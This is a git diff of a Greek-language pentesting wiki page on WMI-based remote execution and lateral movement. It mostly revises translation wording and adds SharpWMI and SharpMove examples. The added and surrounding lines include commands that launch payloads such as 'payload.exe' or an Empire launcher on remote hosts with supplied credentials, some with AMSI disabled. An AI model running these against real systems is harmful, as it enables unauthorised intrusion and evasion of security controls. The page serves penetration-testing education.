@@ -4,7 +4,7 @@
 
 ## Πώς Λειτουργεί
 
-Διεργασίες μπορούν να ανοιχτούν σε hosts όπου το όνομα χρήστη και είτε ο κωδικός πρόσβασης είτε το hash είναι γνωστά μέσω της χρήσης WMI. Οι εντολές εκτελούνται χρησιμοποιώντας WMI από το Wmiexec, παρέχοντας μια ημι-διαδραστική εμπειρία shell.
+Διεργασίες μπορούν να ανοιχτούν σε hosts όπου το όνομα χρήστη και είτε ο κωδικός πρόσβασης είτε το hash είναι γνωστά μέσω της χρήσης του WMI. Οι εντολές εκτελούνται χρησιμοποιώντας το WMI από το Wmiexec, παρέχοντας μια ημι-διαδραστική εμπειρία shell.
 
 **dcomexec.py:** Χρησιμοποιώντας διαφορετικά DCOM endpoints, αυτό το script προσφέρει μια ημι-διαδραστική shell παρόμοια με το wmiexec.py, εκμεταλλευόμενο συγκεκριμένα το αντικείμενο ShellBrowserWindow DCOM. Υποστηρίζει επί του παρόντος τα αντικείμενα MMC20. Application, Shell Windows και Shell Browser Window. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
@@ -24,14 +24,14 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 # Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-Οι κλάσεις εντός ενός ονόματος χώρου μπορούν να απαριθμηθούν χρησιμοποιώντας:
+Οι κλάσεις μέσα σε ένα namespace μπορούν να απαριθμηθούν χρησιμοποιώντας:
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
-### **Κλάσεις**
+### **Classes**
 
-Η γνώση ενός ονόματος κλάσης WMI, όπως το win32_process, και του ονόματος του χώρου ονομάτων στον οποίο βρίσκεται είναι κρίσιμη για οποιαδήποτε λειτουργία WMI.  
+Η γνώση ενός ονόματος κλάσης WMI, όπως το win32_process, και του ονόματος του namespace στο οποίο ανήκει είναι κρίσιμη για οποιαδήποτε WMI λειτουργία.  
 Εντολές για να καταγράψετε τις κλάσεις που αρχίζουν με `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
@@ -45,7 +45,7 @@ Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpCompute
 ```
 ### Μέθοδοι
 
-Οι μέθοδοι, οι οποίες είναι μία ή περισσότερες εκτελέσιμες λειτουργίες των κλάσεων WMI, μπορούν να εκτελούνται.
+Οι μέθοδοι, οι οποίες είναι μία ή περισσότερες εκτελέσιμες συναρτήσεις των κλάσεων WMI, μπορούν να εκτελούνται.
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -71,7 +71,7 @@ net start | findstr "Instrumentation"
 ```
 ### Πληροφορίες Συστήματος και Διαδικασίας
 
-Συγκέντρωση πληροφοριών συστήματος και διαδικασίας μέσω WMI:
+Gathering system and process information through WMI:
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
@@ -85,9 +85,9 @@ wmic useraccount list /format:list
 wmic group list /format:list
 wmic sysaccount list /format:list
 ```
-Η απομακρυσμένη ερώτηση WMI για συγκεκριμένες πληροφορίες, όπως οι τοπικοί διαχειριστές ή οι συνδεδεμένοι χρήστες, είναι εφικτή με προσεκτική κατασκευή εντολών.
+Η απομακρυσμένη ερώτηση του WMI για συγκεκριμένες πληροφορίες, όπως οι τοπικοί διαχειριστές ή οι συνδεδεμένοι χρήστες, είναι εφικτή με προσεκτική κατασκευή εντολών.
 
-### **Μη αυτόματη Απομακρυσμένη Ερώτηση WMI**
+### **Χειροκίνητη Απομακρυσμένη Ερώτηση WMI**
 
 Η διακριτική αναγνώριση τοπικών διαχειριστών σε μια απομακρυσμένη μηχανή και συνδεδεμένων χρηστών μπορεί να επιτευχθεί μέσω συγκεκριμένων ερωτήσεων WMI. Το `wmic` υποστηρίζει επίσης την ανάγνωση από ένα αρχείο κειμένου για την εκτέλεση εντολών σε πολλαπλούς κόμβους ταυτόχρονα.
 
@@ -95,11 +95,7 @@ wmic sysaccount list /format:list
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Αυτή η διαδικασία απεικονίζει την ικανότητα του WMI για απομακρυσμένη εκτέλεση και αναγνώριση συστήματος, επισημαίνοντας τη χρησιμότητά του τόσο για τη διαχείριση συστημάτων όσο και για το pentesting.
-
-## Αναφορές
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+Αυτή η διαδικασία απεικονίζει την ικανότητα του WMI για απομακρυσμένη εκτέλεση και καταμέτρηση συστήματος, επισημαίνοντας τη χρησιμότητά του τόσο για τη διαχείριση συστημάτων όσο και για το pentesting.
 
 ## Αυτόματα Εργαλεία
 
@@ -107,4 +103,24 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Μπορείτε επίσης να χρησιμοποιήσετε **Impacket's `wmiexec`**.
+
+
+## Αναφορές
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
